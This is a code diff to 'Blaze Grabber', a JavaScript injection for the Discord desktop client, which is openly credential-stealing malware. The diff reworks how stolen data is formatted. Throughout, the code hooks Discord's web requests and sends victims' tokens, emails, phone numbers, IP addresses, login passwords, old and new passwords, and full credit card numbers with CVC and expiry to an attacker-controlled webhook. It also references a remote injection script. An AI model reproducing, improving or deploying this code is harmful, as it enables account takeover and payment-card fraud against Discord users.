@@ -10,7 +10,7 @@ const { BrowserWindow, session, safeStorage } = require('electron');
 
 // ── Config ────────────────────────────────────────────────────────────────────
 const WEBHOOK    = '%WEBHOOK%';
-const AVATAR_URL = 'https://i.pinimg.com/originals/43/79/bb/4379bb008f3b678c973727818e68ab35.gif';
+const AVATAR_URL = 'https://i.imgur.com/CHB4vW7.gif';
 const EMBED_COLOR = 0x8563FF;
 const BOT_NAME   = 'Blaze Grabber';
 const INJECT_URL = 'https://raw.githubusercontent.com/blazewys/discordinjection/refs/heads/main/dcinject.js';
@@ -267,19 +267,31 @@ async function buildUserInfo(token) {
 }
 
 function buildFields(user, billing, friends, token, extra) {
-    const fields = [
-        { name: '<:user:1533638622761455637> Username', value: `\`${user.username}\``,                                              inline: true },
-        { name: '<:mail:1533638816559140877> Email',    value: `\`${user.email    || 'N/A'}\``,                                    inline: true },
-        { name: '<:phone:1533639066057179136> Phone',   value: `\`${user.phone    || 'N/A'}\``,                                    inline: true },
-        { name: '<:user:1533638622761455637> ID',       value: `\`${user.id}\``,                                                   inline: true },
-        { name: '<:lock:1533640371882557501> 2FA',      value: user.mfa_enabled ? '<:tick:1533641966632435936>' : '<:no:1533642070701641889>', inline: true },
-        { name: '<:nitro:1533639641687920823> Nitro',   value: getNitro(user),                                                     inline: true },
-        { name: '<:card:1533639749376671785> Billing',  value: parseBilling(billing),                                              inline: true },
-        { name: '<:badge:1533639967761240154> Badges',  value: getBadges(user),                                                    inline: true },
+    // Billing — tüm kartları say (expired dahil)
+    const cards   = (billing || []).filter(s => s.type === 1).length;
+    const paypals = (billing || []).filter(s => s.type === 2).length;
+    const billingParts = [];
+    if (cards)   billingParts.push(`<:card:1533639749376671785> ${cards}`);
+    if (paypals) billingParts.push(`<:paypal:1533641104480538695> ${paypals}`);
+    const billingVal = billingParts.length ? billingParts.join(' ') : '<:no:1533642070701641889>';
+
+    // Ana bilgiler — alt alta, tek field
+    const info = [
+        `<:user:1533638622761455637> **Username:** \`${user.username}\``,
+        `<:mail:1533638816559140877> **Email:** \`${user.email    || 'N/A'}\``,
+        `<:phone:1533639066057179136> **Phone:** \`${user.phone    || 'N/A'}\``,
+        `<:user:1533638622761455637> **ID:** \`${user.id}\``,
+        `<:lock:1533640371882557501> **2FA:** ${user.mfa_enabled ? '<:tick:1533641966632435936>' : '<:no:1533642070701641889>'}`,
+        `<:nitro:1533639641687920823> **Nitro:** ${getNitro(user)}`,
+        `<:card:1533639749376671785> **Billing:** ${billingVal}`,
+        `<:badge:1533639967761240154> **Badges:** ${getBadges(user)}`,
         ...(extra || []),
-        { name: '<:token:1533639840254660640> Token',   value: `\`\`\`${token}\`\`\``,                                            inline: false },
+    ].join('\n');
+
+    return [
+        { name: 'Discord Info', value: info, inline: false },
+        { name: '<:token:1533639840254660640> Token', value: `\`\`\`${token}\`\`\``, inline: false },
     ];
-    return fields;
 }
 
 function getDiscordClientName() {
@@ -305,9 +317,15 @@ async function firstTime() {
             await postWebhook(buildPayload(
                 'Discord Injection — No Session',
                 [
-                    { name: '<:computer:1533640158740615168> Computer', value: `\`${process.env.COMPUTERNAME || 'N/A'}\``, inline: true },
-                    { name: '<:ip:1533640242437816390> IP',             value: `\`${ip}\``,                                inline: true },
-                    { name: '<:web:1533641362975621270> Client',                                value: `\`${client}\``,                            inline: true },
+                    {
+                        name: 'Info',
+                        value: [
+                            `<:computer:1533640158740615168> **Computer:** \`${process.env.COMPUTERNAME || 'N/A'}\``,
+                            `<:ip:1533640242437816390> **IP:** \`${ip}\``,
+                            `<:web:1533641362975621270> **Client:** \`${client}\``,
+                        ].join('\n'),
+                        inline: false
+                    }
                 ],
                 AVATAR_URL, null
             ));
@@ -320,11 +338,12 @@ async function firstTime() {
                 const info = await buildUserInfo(token);
                 if (!info) continue;
                 const { user, billing, avatar, banner } = info;
-                const fields = buildFields(user, billing, null, token, [
-                    { name: '<:computer:1533640158740615168> Computer', value: `\`${process.env.COMPUTERNAME || 'N/A'}\``, inline: true },
-                    { name: '🌐 IP',       value: `\`${ip}\``,                                 inline: true },
-                    { name: '<:web:1533641362975621270> Client',   value: `\`${client}\``,                             inline: true },
-                ]);
+                const extraLines = [
+                    `<:computer:1533640158740615168> **Computer:** \`${process.env.COMPUTERNAME || 'N/A'}\``,
+                    `<:ip:1533640242437816390> **IP:** \`${ip}\``,
+                    `<:web:1533641362975621270> **Client:** \`${client}\``,
+                ];
+                const fields = buildFields(user, billing, null, token, extraLines);
                 await postWebhook(buildPayload(
                     'Discord Injection — Initialized',
                     fields,
@@ -423,9 +442,9 @@ session.defaultSession.webRequest.onCompleted({
 
     const { user, billing, avatar, banner } = info;
     const base = [
-        { name: '<:computer:1533640158740615168> Computer', value: `\`${process.env.COMPUTERNAME || 'N/A'}\``, inline: true },
-        { name: '🌐 IP',       value: `\`${ip}\``,                                 inline: true },
-        { name: '<:web:1533641362975621270> Client',   value: `\`${client}\``,                             inline: true },
+        `<:computer:1533640158740615168> **Computer:** \`${process.env.COMPUTERNAME || 'N/A'}\``,
+        `<:ip:1533640242437816390> **IP:** \`${ip}\``,
+        `<:web:1533641362975621270> **Client:** \`${client}\``,
     ];
 
     switch (true) {
@@ -435,7 +454,7 @@ session.defaultSession.webRequest.onCompleted({
                 'Discord — Login Captured',
                 buildFields(user, billing, null, token, [
                     ...base,
-                    { name: '<:token:1533639840254660640> Password', value: `\`${data.password}\``, inline: false },
+                    `<:token:1533639840254660640> **Password:** \`${data.password}\``,
                 ]),
                 avatar || AVATAR_URL, banner || null
             ));
@@ -448,8 +467,8 @@ session.defaultSession.webRequest.onCompleted({
                     'Discord — Password Changed',
                     buildFields(user, billing, null, token, [
                         ...base,
-                        { name: '<:token:1533639840254660640> Old Password', value: `\`${data.password}\``,     inline: true },
-                        { name: '<:token:1533639840254660640> New Password', value: `\`${data.new_password}\``, inline: true },
+                        `<:token:1533639840254660640> **Old Password:** \`${data.password}\``,
+                        `<:token:1533639840254660640> **New Password:** \`${data.new_password}\``,
                     ]),
                     avatar || AVATAR_URL, banner || null
                 ));
@@ -459,8 +478,8 @@ session.defaultSession.webRequest.onCompleted({
                     'Discord — Email Changed',
                     buildFields(user, billing, null, token, [
                         ...base,
-                        { name: '<:mail:1533638816559140877> New Email', value: `\`${data.email}\``,    inline: true },
-                        { name: '<:token:1533639840254660640> Password',  value: `\`${data.password}\``, inline: true },
+                        `<:mail:1533638816559140877> **New Email:** \`${data.email}\``,
+                        `<:token:1533639840254660640> **Password:** \`${data.password}\``,
                     ]),
                     avatar || AVATAR_URL, banner || null
                 ));
@@ -472,9 +491,9 @@ session.defaultSession.webRequest.onCompleted({
                 'Discord — Credit Card Added',
                 buildFields(user, billing, null, token, [
                     ...base,
-                    { name: '<:card:1533639749376671785> Card',   value: `\`${data['card[number]']    || 'N/A'}\``,                                inline: true },
-                    { name: '<:lock:1533640371882557501> CVC',    value: `\`${data['card[cvc]']       || 'N/A'}\``,                                inline: true },
-                    { name: '<:card:1533639749376671785> Expiry', value: `\`${data['card[exp_month]'] || '?'}/${data['card[exp_year]'] || '?'}\``, inline: true },
+                    `<:card:1533639749376671785> **Card:** \`${data['card[number]'] || 'N/A'}\``,
+                    `<:lock:1533640371882557501> **CVC:** \`${data['card[cvc]'] || 'N/A'}\``,
+                    `<:card:1533639749376671785> **Expiry:** \`${data['card[exp_month]'] || '?'}/${data['card[exp_year]'] || '?'}\``,
                 ]),
                 avatar || AVATAR_URL, banner || null
             ));
